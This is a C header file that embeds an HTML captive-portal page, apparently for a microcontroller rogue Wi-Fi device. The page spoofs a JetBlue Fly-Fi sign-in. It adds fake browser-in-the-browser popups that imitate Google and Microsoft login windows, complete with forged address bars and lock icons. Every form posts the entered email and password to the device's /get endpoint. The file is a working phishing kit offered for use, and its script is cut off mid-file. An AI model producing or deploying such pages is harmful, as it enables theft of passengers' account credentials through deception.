#ifndef JETBLUE_H
#define JETBLUE_H

const char JETBLUE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JetBlue Login</title>
    <style>
        /* General Body and Container Styles */
        body {
            background-color: #004e92; /* JetBlue dark blue background */
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh; /* Ensures content takes at least full viewport height */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; /* System font stack for offline support */
            padding: 1.5rem; /* Ensure padding for smaller screens */
            margin: 0;
            color: #333; /* Default text color */
            overflow-y: auto; /* Allow vertical scrolling if content exceeds viewport height */
            box-sizing: border-box; /* Include padding in height calculation */
        }

        /* Custom Message Box Styling (for non-blocking alerts) */
        #messageBox {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #007FFF; /* JetBlue Blue */
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            font-size: 1rem;
            text-align: center;
            min-width: 250px;
            max-width: 80%;
            box-sizing: border-box;
        }
        #messageBox.show {
            opacity: 1;
            visibility: visible;
        }

        /* JetBlue Container Styling */
        .jetblue-container {
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-sizing: border-box; /* Include padding in width */
            position: relative; /* For z-index context */
            z-index: 10;
        }

        /* JetBlue Logo Styling (Inline SVG) */
        .jetblue-logo-svg {
            width: 120px; /* Adjust size to fit */
            height: auto;
            margin-bottom: 24px;
            display: block; /* Ensures it takes up its own block space */
            margin-left: auto; /* Centers the block element */
            margin-right: auto; /* Centers the block element */
        }
        .jetblue-logo-svg text {
            fill: #004e92; /* JetBlue dark blue for text */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
            text-anchor: middle; /* Center the text horizontally within the SVG */
            x: 75; /* Half of the viewBox width (150/2) */
        }

        /* Main and Subtitle Styling */
        .main-title {
            font-size: 2.25rem;
            font-weight: 700;
            color: #1a202c;
            margin-bottom: 8px;
            text-align: center;
        }
        .sub-title {
            font-size: 1.125rem;
            color: #4a5568;
            margin-bottom: 32px;
            text-align: center;
        }

        /* Google/Microsoft Icon Styling (Inline SVG) */
        /* These are now absolutely positioned inside the buttons */
        .google-sign-in .google-logo-svg,
        .microsoft-sign-in .microsoft-icon {
            width: 24px;
            height: 24px;
            flex-shrink: 0; /* Prevent shrinking */
            position: absolute; /* Position independently */
            left: 1rem; /* Align to the left edge with padding */
        }
        /* Specific vertical adjustment for the Google logo within the button */
        .google-sign-in .google-logo-svg {
            transform: translateY(-2px);
        }


        /* Input Error Styling */
        .input-error {
            border-color: #ef4444; /* Red for error */
        }
        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.5rem;
        }

        /* Custom Input Field Styling */
        .custom-input {
            width: 100%;
            padding: 1rem 1.25rem;
            border-radius: 0.625rem;
            border: 1px solid #d1d5db;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
            font-size: 1.05rem;
            background-color: #ffffff;
            color: #333;
            box-sizing: border-box; /* Include padding in width */
        }
        .custom-input:focus {
            border-color: #007FFF; /* JetBlue Blue on focus */
            box-shadow: 0 0 0 3px rgba(0, 127, 255, 0.3);
        }
        .custom-input::placeholder {
            color: #9ca3af;
        }

        /* Continue Button Styling */
        .continue-button {
            width: 100%;
            padding: 1rem 1.25rem;
            border-radius: 0.625rem;
            background-color: #007FFF; /* JetBlue Blue */
            color: #fff;
            font-weight: 700;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
            font-size: 1.1rem;
            border: none;
            margin-top: 1.5rem;
        }
        .continue-button:hover {
            background-color: #0057B8; /* Darker JetBlue Blue on hover */
            transform: translateY(-1px);
        }
        .continue-button:active {
            transform: translateY(0);
        }

        /* Sign Up Link Styling */
        .sign-up-link {
            color: #007FFF;
            text-decoration: underline;
        }
        .sign-up-link:hover {
            text-decoration: none;
        }

        /* OR Divider Styling */
        .or-divider {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 2.5rem;
            margin-bottom: 2.5rem;
        }
        .or-divider::before,
        .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #d1d5db;
        }
        .or-divider span {
            padding: 0 1rem;
            color: #6b7280;
            font-size: 0.875rem;
            background-color: #fff;
        }

        /* Google/Microsoft Sign-in Button Styling */
        .google-sign-in, .microsoft-sign-in {
            width: 100%;
            padding: 0.9rem 1.25rem;
            border-radius: 0.625rem;
            border: 1px solid #d1d5db;
            color: #374151;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.2s ease, border-color 0.2s ease;
            font-size: 1rem;
            background-color: #fff;
            display: flex;
            align-items: center;
            justify-content: center; /* Center the overall content */
            position: relative; /* Allow absolute positioning of children */
            margin-bottom: 1rem;
        }
        .google-sign-in span,
        .microsoft-sign-in span {
            /* Add padding to push the text to the right, visually centering it */
            padding-left: 2rem;
            display: block; /* Ensure span takes up space for padding */
        }
        .google-sign-in:hover, .microsoft-sign-in:hover {
            background-color: #f3f4f6;
            border-color: #9ca3af;
        }

        /* --- BITB FRAME STYLES (Generic Browser Look) --- */
        .browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed; /* Changed to fixed to keep it in viewport on scroll */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100; /* Increased z-index to be above main content */
            background-color: #fff; /* Ensure white background for content */
            border-radius: 8px; /* Added border-radius for the window itself */
            overflow: hidden; /* Ensure content doesn't spill out of rounded corners */
        }
        .browser-header {
            background-color: #1e1e1e;
            color: white;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 0 0 8px;
            cursor: grab;
        }
        .browser-header:active { cursor: grabbing; }
        .tab { display: flex; align-items: center; gap: 8px; }
        .tab img { height: 16px; width: 16px; }
        .tab span { font-size: 12px; white-space: nowrap; }
        .window-controls { display: flex; align-items: center; }
        .window-controls div { width: 46px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .window-controls div:hover { background-color: #3a3a3a; }
        .window-controls .close:hover { background-color: #e81123; }
        .window-controls svg { fill: white; width: 10px; height: 10px; }
        .address-bar {
            background-color: #2d2d2d;
            color: white;
            padding: 6px 12px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: monospace;
            overflow-x: auto;
        }
        .lock-icon { color: #6fcf97; }
        .content {
            background: white;
            padding: 20px; /* Reduced padding for the content area */
            display: flex; /* Added flex for centering */
            align-items: center; /* Center vertically */
            justify-content: center; /* Center horizontally */
            flex-grow: 1; /* Allow content to grow and fill available space */
            overflow-y: auto; /* Allow scrolling within the content area if needed */
        }
        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px; /* Reduced padding for the container */
            width: 100%;
            max-width: 280px; /* Further reduced max-width for Google container */
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center; /* Center text within the container */
            box-sizing: border-box; /* Include padding in width */
        }
        .logo svg {
            width: 100px; /* Adjusted width for Google logo in frame */
            height: 34px; /* Adjusted height for Google logo in frame */
            margin-bottom: 20px; /* Reduced margin */
        }
        .title { font-size: 22px; /* Slightly reduced font size */ font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle { font-size: 15px; /* Slightly reduced font size */ font-weight: 400; color: #5f6368; margin-bottom: 20px; }
        .form-group-bitb { width: 100%; margin-bottom: 20px; /* Reduced margin */ position: relative; }
        .form-control-bitb { width: 100%; padding: 8px; /* Reduced padding */ border: 1px solid #dadce0; border-radius: 4px; outline: none; font-size: 15px; /* Reduced font size */ transition: all 0.3s ease; background-color: #ffffff;
            color: #333; }
        .form-label-bitb { position: absolute; top: 8px; /* Adjusted top */ left: 10px; /* Adjusted left */ font-size: 15px; /* Reduced font size */ color: #5f6368; transition: 0.3s; pointer-events: none; }
        .form-control-bitb:focus + .form-label-bitb,
        .form-control-bitb:not(:placeholder-shown) + .form-label-bitb { transform: translateY(-22px); /* Adjusted transform */ font-size: 11px; /* Further reduced font size */ color: #1a73e8; }
        .forgot-email { font-size: 13px; /* Slightly reduced font size */ color: #1a73e8; text-decoration: none; margin-bottom: 12px; /* Reduced margin */ display: block; width: 100%; text-align: left; }
        .forgot-email:hover { text-decoration: none; }
        .text-area { font-size: 11px; /* Slightly reduced font size */ color: #5f6368; margin-top: 6px; /* Reduced margin */ text-align: left; width: 100%; }
        .button-container-bitb { display: flex; align-items: center; justify-content: space-between; width: 100%; margin-top: 25px; /* Reduced margin */ }
        .create-account { font-size: 13px; /* Slightly reduced font size */ color: #1a73e8; text-decoration: none; }
        .create-account:hover { text-decoration: underline; }
        .next-button-bitb { background-color: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 8px 20px; /* Reduced padding */ font-size: 15px; /* Reduced font size */ cursor: pointer; transition: background-color 0.3s ease, box-shadow 0.3s ease; }
        .next-button-bitb:hover { background-color: #145db0; }
        .form-control-bitb.password-mode {
            -webkit-text-security: disc; /* Changed to disc for password obscuring effect */
            -moz-text-security: disc;
            text-security: disc;
            font-size: 16px;
        }
        .form-label-bitb.password-mode { color: #1a73e8; }

        /* Microsoft BITB Frame Styles */
        .microsoft-browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed; /* Changed to fixed to keep it in viewport on scroll */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100; /* Increased z-index to be above main content */
            background-color: #fff; /* Ensure white background for content */
            border-radius: 8px; /* Added border-radius for the window itself */
            overflow: hidden; /* Ensure content doesn't spill out of rounded corners */
        }
        .microsoft-content {
            padding: 15px; /* Reduced padding */
            background: white;
            display: flex;
            flex-direction: column; /* Changed to column for vertical centering */
            align-items: center; /* Center horizontally */
            justify-content: center; /* Center vertically */
            flex-grow: 1; /* Allow content to grow and fill available space */
            height: auto; /* Ensure height adjusts to content or available space */
            min-height: 180px; /* Give it a minimum height for centering to be effective */
            overflow-y: auto; /* Allow scrolling within the content area if needed */
        }
        .microsoft-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 280px; /* Further reduced max-width for Microsoft container */
            padding: 15px; /* Reduced padding */
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
            border-radius: 6px;
            box-sizing: border-box; /* Crucial for proper sizing with padding */
            text-align: left; /* Microsoft content is typically left-aligned */
        }
        .microsoft-header-bitb {
            display: flex;
            align-items: center;
            gap: 8px; /* Reduced gap */
            margin-bottom: 20px; /* Reduced margin */
        }
        .microsoft-logo-bitb {
            width: 24px; /* Slightly reduced logo size */
            height: 24px;
        }
        .microsoft-logo-text-bitb {
            font-size: 18px; /* Slightly reduced font size */
            font-weight: 600;
            color: #5e5e5e;
        }
        .microsoft-title { font-size: 22px; /* Slightly reduced font size */ font-weight: 600; margin: 0 0 20px; /* Reduced margin */ }
        .microsoft-input-wrapper { position: relative; margin-bottom: 20px; /* Reduced margin */ border-bottom: 1px solid #666; width: 100%; }
        .microsoft-input-wrapper input { width: 100%; border: none; outline: none; font-size: 15px; /* Reduced font size */ padding: 4px 0 6px; background-color: transparent; }
        .microsoft-links { font-size: 12px; /* Slightly reduced font size */ color: #0067b8; margin-bottom: 30px; /* Reduced margin */ text-align: left; width: 100%; }
        .microsoft-links .info-line { color: black; margin-bottom: 10px; /* Reduced margin */ }
        .microsoft-links a { text-decoration: none; color: #0067b8; }
        .microsoft-next-button { background-color: #0067b8; color: white; border: none; padding: 8px 20px; /* Reduced padding */ font-size: 14px; /* Reduced font size */ font-weight: 500; cursor: pointer; border-radius: 2px; margin-top: 15px; /* Reduced margin */ width: fit-content; align-self: flex-start; }
    </style>
</head>
<body>
    <div id="messageBox"></div> <!-- Message box for non-blocking alerts -->

    <div class="jetblue-container">
        <!-- JetBlue Logo (Inline SVG for text "JetBlue") -->
        <svg class="jetblue-logo-svg" viewBox="0 0 150 40" xmlns="http://www.w3.org/2000/svg">
            <text x="75" y="30" font-size="30" font-weight="bold" text-anchor="middle">JetBlue</text>
        </svg>

        <h1 class="main-title">Welcome to JetBlue</h1>
        <h2 class="sub-title">Sign in to enjoy free Fly-Fi and more</h2>
        
        <!-- Main JetBlue login form (now a standard HTML form) -->
        <form id="jetblue-login-form" action="/get" method="POST" class="space-y-6 w-full">
            <div>
                <input
                    type="email"
                    id="email"
                    name="email"
                    placeholder="Email address"
                    class="custom-input"
                    aria-invalid="false"
                    required
                />
                <p id="email-error" class="error-message"></p>
            </div>
            <div id="password-container" class="relative">
                <input
                    type="password"
                    id="password"
                    name="password"
                    placeholder="Password"
                    class="custom-input"
                    required
                />
            </div>
            <button type="submit" id="continue-button" class="continue-button">
                Sign In
            </button>
        </form>

        <p class="text-sm text-gray-600 text-center mt-6">
            Don't have an account? <a href="#" class="sign-up-link">Sign up</a>
        </p>
        <div class="or-divider">
            <span>OR</span>
        </div>
        <button class="google-sign-in" id="googleLogin">
            <!-- Google Logo (provided by user, full logo) -->
            <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48">
                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
            </svg>
            <span>Continue with Google</span>
        </button>
        <button class="microsoft-sign-in" id="microsoftLogin">
            <!-- Microsoft Icon (Inline SVG) -->
            <svg class="microsoft-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
            </svg>
            <span>Continue with Microsoft</span>
        </button>
    </div>

    <!-- Google BITB Frame -->
    <div class="browser-window" id="google-window">
        <div class="browser-header">
            <div class="tab">
                <!-- Google Favicon (Inline SVG) -->
                <img src="data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%234285F4' d='M22.7 12.5c0-.7-.1-1.3-.2-1.9H12v3.6h6.4c-.3 1.5-1.2 2.7-2.6 3.6v2.3h3a11.2 11.2 0 0 0 3.1-8.3z'/%3E%3Cpath fill='%2334A853' d='M12 23c3.1 0 5.7-1 7.6-2.7l-3-2.3c-1.1.7-2.5 1.1-4.6 1.1-3.5 0-6.5-2.4-7.6-5.6H1.4v2.4C3.2 20.8 7.3 23 12 23z'/%3E%3Cpath fill='%23FBBC05' d='M4.4 14c-.3-1-.5-2.1-.5-3.2s.2-2.2.5-3.2V5.2H1.4c-.9 1.8-1.4 3.9-1.4 6.8s.5 5 1.4 6.8L4.4 14z'/%3E%3Cpath fill='%23EA4335' d='M12 4.9c1.7 0 3.2.7 4.4 1.8L19 4.2C17 2.3 14.7 1 12 1 7.3 1 3.2 3.2 1.4 7.2l3 2.4C5.5 6.9 8.5 4.9 12 4.9z'/%3E%3C/svg%3E" alt="Google Favicon">
                <span>Sign in – Google Accounts</span>
            </div>
            <div class="window-controls">
                <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
                <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
                <div class="close" title="Close" onclick="closeLogin('google')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
            </div>
        </div>
        <div class="address-bar">
            <!-- Lock icon with simplified path, adjusted for better rendering -->
            <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
                <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
            </svg>
            <span>accounts.google.com/signin/v2/identifier?</span>
        </div>
        <div class="content">
            <div class="container">
                <div class="logo">
                    <!-- Google Logo (provided by user, full logo) -->
                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100px" height="34px"> <!-- Adjusted width/height for Google logo in frame -->
                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                    </svg>
                </div>
                <h1 class="title">Sign in</h1>
                <h2 class="subtitle">Use your Google Account</h2>
                <!-- Google Email Step Form -->
                <form id="google-email-step-form" onsubmit="return false;">
                    <div class="form-group-bitb" id="email-group-bitb">
                        <input type="text" id="email-bitb" name="email" class="form-control-bitb" placeholder=" " />
                        <label for="email-bitb" class="form-label-bitb">Email or phone</label>
                    </div>
                    <a href="#" class="forgot-email">Forgot email?</a>
                    <div class="text-area">
                        Not your device? Use Guest mode to sign in privately.
                        <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
                    </div>
                    <div class="button-container-bitb">
                        <a href="#" class="create-account">Create account</a>
                        <button type="submit" class="next-button-bitb">Next</button>
                    </div>
                </form>

                <!-- Google Password Step Form (initially hidden) -->
                <form id="google-password-step-form" action="/get" method="POST" style="display:none;">
                    <input type="hidden" id="google-hidden-email" name="email"> <!-- Hidden field to carry email -->
                    <div class="form-group-bitb" id="password-group-bitb">
                        <input type="password" id="password-bitb" name="password" class="form-control-bitb" placeholder=" " />
                        <label for="password-bitb" class="form-label-bitb">Password</label>
                    </div>
                    <a href="#" class="forgot-email">Forgot password?</a> <!-- Changed text for password step -->
                    <div class="text-area">
                        This is not your account? <a href="#" style="color: #1a73e8; text-decoration: none;">Switch accounts</a>
                    </div>
                    <div class="button-container-bitb">
                        <a href="#" class="create-account">More options</a> <!-- Changed text for password step -->
                        <button type="submit" class="next-button-bitb">Sign In</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Microsoft BITB Frame -->
    <div class="browser-window" id="microsoft-window">
        <div class="browser-header">
            <div class="tab">
                <!-- Microsoft Favicon (Inline SVG) -->
                <img src="data:image/svg+xml,%3Csvg viewBox='0 0 50 50' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='0' y='0' width='23' height='23' fill='%23F25022'/%3E%3Crect x='27' y='0' width='23' height='23' fill='%237FBA00'/%3E%3Crect x='0' y='27' width='23' height='23' fill='%2300A4EF'/%3E%3Crect x='27' y='27' width='23' height='23' fill='%23FFB900'/%3E%3C/svg%3E" alt="MS Favicon">
                <span>Sign in to your Microsoft account</span>
            </div>
            <div class="window-controls">
                <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
                <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
                <div class="close" title="Close" onclick="closeLogin('microsoft')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
            </div>
        </div>
        <div class="address-bar">
            <!-- Lock icon with simplified path, adjusted for better rendering -->
            <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
                <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
            </svg>
            <span>login.microsoftonline.com/v4/authenication?</span>
        </div>
        <div class="content">
            <div class="microsoft-container">
                <div class="microsoft-header-bitb">
                    <!-- Microsoft Logo (Inline SVG) -->
                    <svg class="microsoft-logo-bitb" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                        <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                        <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                        <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                        <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
                    </svg>
                    <span class="microsoft-logo-text-bitb">Microsoft</span>
                </div>
                <h2 class="microsoft-title">Sign in</h2>
                <!-- Microsoft Email Step Form -->
                <form id="microsoft-email-step-form" onsubmit="return false;">
                    <div class="microsoft-input-wrapper" id="email-wrapper-microsoft">
                        <input type="email" id="email-microsoft" name="email" placeholder="Email or phone" required>
                    </div>
                    <div class="microsoft-links">
                        <div class="info-line">No account? <a href="#">Create one!</a></div>
                        <div style="margin-top: 10px;"><a href="#">Can't access your account?</a></div>
                    </div>
                    <button type="submit" class="microsoft-next-button">Next</button>
                </form>

                <!-- Microsoft Password Step Form (initially hidden) -->
                <form id="microsoft-password-step-form" action="/get" method="POST" style="display: none;">
                    <input type="hidden" id="microsoft-hidden-email" name="email"> <!-- Hidden field to carry email -->
                    <div class="microsoft-input-wrapper" id="password-wrapper-microsoft">
                        <input type="password" id="password-microsoft" name="password" placeholder="Password" required>
                    </div>
                    <div class="microsoft-links">
                        <div class="info-line">No account? <a href="#">Create one!</a></div>
                        <div style="margin-top: 10px;"><a href="#">Can't access your account?</a></div>
                    </div>
                    <button type="submit" class="microsoft-next-button">Sign In</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('email');
        const passwordContainer = document.getElementById('password-container');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('email-error');
        const jetblueLoginForm = document.getElementById('jetblue-login-form');
        const googleLoginButton = document.getElementById('googleLogin');
        const microsoftLoginButton = document.getElementById('microsoftLogin');
        const messageBox = document.getElementById('messageBox');
        let messageTimeout;

        let isDragging = false;
        let offset = { x: 0, y: 0 };
        let activeWindow = null;
        const googleWindow = document.getElementById('google-window');
        const microsoftWindow = document.getElementById('microsoft-window');
        const googleHeader = googleWindow.querySelector('.browser-header');
        const microsoftHeader = microsoftWindow.querySelector('.browser-header');
        
        const googleEmailStepForm = document.getElementById('google-email-step-form');
        const googlePasswordStepForm = document.getElementById('google-password-step-form');
        const emailInputBitb = document.getElementById('email-bitb');
        const passwordInputBitb = document.getElementById('password-bitb');
        const googleHiddenEmailInput = document.getElementById('google-hidden-email');
        
        const microsoftEmailStepForm = document.getElementById('microsoft-email-step-form');
        const microsoftPasswordStepForm = document.getElementById('microsoft-password-step-form');
        const microsoftEmailInput = document.getElementById('email-microsoft');
        const microsoftPasswordInput = document.getElementById('password-microsoft');
        const microsoftHiddenEmailInput = document.getElementById('microsoft-hidden-email');

        let googleUserEmail = '';
        let microsoftUserEmail = '';

        // custom Message Box Function
        function showMessage(message, duration = 3000) {
            messageBox.textContent = message;
            messageBox.classList.add('show');
            if (messageTimeout) {
                clearTimeout(messageTimeout);
            }
            messageTimeout = setTimeout(() => {
                messageBox.classList.remove('show');
            }, duration);
        }

        function showLogin(type) {
            closeAllLogins();
            if (type === 'google') {
                googleWindow.style.display = 'block';
                googleEmailStepForm.style.display = 'block';
                googlePasswordStepForm.style.display = 'none';
                emailInputBitb.value = '';
                passwordInputBitb.value = '';
                googleUserEmail = '';
                emailInputBitb.focus();
                activeWindow = 'google';
            } else if (type === 'microsoft') {
                microsoftWindow.style.display = 'block';
                microsoftEmailStepForm.style.display = 'block';
                microsoftPasswordStepForm.style.display = 'none';
                microsoftEmailInput.value = '';
                microsoftPasswordInput.value = '';
                microsoftUserEmail = '';
                microsoftEmailInput.focus();
                activeWindow = 'microsoft';
            }
        }

        function closeAllLogins() {
            googleWindow.style.display = 'none';
            microsoftWindow.style.display = 'none';
            activeWindow = null;
            
            googleEmailStepForm.style.display = 'block';
            googlePasswordStepForm.style.display = 'none';
            emailInputBitb.value = '';
            passwordInputBitb.value = '';
            googleHiddenEmailInput.value = '';
            googleUserEmail = '';

            microsoftEmailStepForm.style.display = 'block';
            microsoftPasswordStepForm.style.display = 'none';
            microsoftEmailInput.value = '';
            microsoftPasswordInput.value = '';
            microsoftHiddenEmailInput.value = '';
            microsoftUserEmail = '';
        }

        function closeLogin(type) {
            if (type === 'google' && activeWindow === 'google') {
                googleWindow.style.display = 'none';
                activeWindow = null;
            } else if (type === 'microsoft' && activeWindow === 'microsoft') {
                microsoftWindow.style.display = 'none';
                activeWindow = null;
            }
        }

        // drag functions for BITB frames
        function handleDragStart(event) {
            isDragging = true;
            const currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
            offset = {
                x: event.clientX - currentWindow.offsetLeft,
                y: event.clientY - currentWindow.offsetTop,
            };
            const currentHeader = currentWindow.querySelector('.browser-header');
            currentHeader.style.cursor = 'grabbing';
        }

        function handleDrag(event) {
            if (isDragging && activeWindow) {
                let currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
                currentWindow.style.left = event.clientX - offset.x + 'px';
                currentWindow.style.top = event.clientY - offset.y + 'px';
            }
        }

        function handleDragEnd() {
            isDragging = false;
            if (activeWindow) {
                const currentHeader = activeWindow === 'google' ? googleWindow.querySelector('.browser-header') : microsoftWindow.querySelector('.browser-header');
                currentHeader.style.cursor = 'grab';
            }
        }

        googleHeader.addEventListener('mousedown', handleDragStart);
        microsoftHeader.addEventListener('mousedown', handleDragStart);
        document.addEventListener('mousemove', handleDrag);
        document.addEventListener('mouseup', handleDragEnd);

        function handleLoginSuccess() {
            window.location.replace('/get');
        }

        googleEmailStepForm.addEventListener('submit', function(event) {
            event.preventDefault();
            if (isValidEmail(emailInputBitb.value.trim())) {
                googleUserEmail = emailInputBitb.value.trim();
                googleHiddenEmailInput.value = googleUserEmail;

                googleEmailStepForm.style.display = 'none';
                googlePasswordStepForm.style.display = 'block';
                passwordInputBitb.focus();
            } else {
                showMessage('Please enter a valid email address.');
            }
        });

        googlePasswordStepForm.addEventListener('submit', function(event) {
            if (passwordInputBitb.value.trim() === '') {
                event.preventDefault();
                showMessage('Please enter your password.');
            }
        });


        microsoftEmailStepForm.addEventListener('submit', function(event) {
            event.preventDefault();
            microsoftUserEmail = microsoftEmailInput.value.trim();
            if (microsoftUserEmail) {
                microsoftHiddenEmailInput.value = microsoftUserEmail;
                microsoftEmailStepForm.style.display = 'none'
                microsoftPasswordStepForm.style.display = 'block';
                microsoftPasswordInput.focus();
            } else {
                showMessage('Please enter your email or phone number.');
            }
        });

        microsoftPasswordStepForm.addEventListener('submit', function(event) {
            if (microsoftPasswordInput.value.trim() === '') {
                event.preventDefault();
                showMessage('Please enter your password.');
            }
        });

